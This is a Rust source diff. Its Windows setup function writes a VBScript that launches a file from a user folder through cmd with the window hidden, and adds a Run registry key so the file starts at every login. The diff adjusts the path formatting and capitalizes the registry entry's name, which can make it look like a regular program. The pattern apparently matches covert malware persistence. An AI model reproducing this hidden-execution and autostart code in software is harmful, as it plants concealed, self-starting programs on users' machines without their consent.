@@ -69,6 +69,14 @@ pub fn parse_config(s: &str) -> ConfigMap {
   return parsed;
 }
 
+pub fn uppercase_first_letter(s: &str) -> String {
+  let mut c = s.chars();
+  match c.next() {
+    None => String::new(),
+    Some(f) => f.to_uppercase().collect::<String>() + c.as_str(),
+  }
+}
+
 #[cfg(target_os = "windows")]
 pub fn setup(name: &str) -> Result<()> {
   use dirs::{data_local_dir, picture_dir};
@@ -96,9 +104,9 @@ pub fn setup(name: &str) -> Result<()> {
     let vbs_content = format!(
       r#"
       Set oShell = CreateObject("Wscript.Shell")
-      oShell.Run "cmd /c {:?}", 0, false
+      oShell.Run "cmd /c {}", 0, false
     "#,
-      image_path
+      image_path.display()
     );
 
     fs::write(&vbs_path, &vbs_content)?;
@@ -113,11 +121,11 @@ pub fn setup(name: &str) -> Result<()> {
     let vbs_content = format!(
       r#"
       Set oShell = CreateObject("Wscript.Shell")
-      oShell.Run "cmd /c {target_path:?}", 0, false
-      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{name}","{target_path:?}","REG_SZ"
+      oShell.Run "cmd /c {target_path}", 0, false
+      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{reg_name}","{target_path}","REG_SZ"
     "#,
-      name = name,
-      target_path = target_path
+      reg_name = uppercase_first_letter(name),
+      target_path = target_path.display()
     );
     fs::write(&vbs_path, &vbs_content)?;
     Command::new("wscript").arg(&vbs_path).output()?;
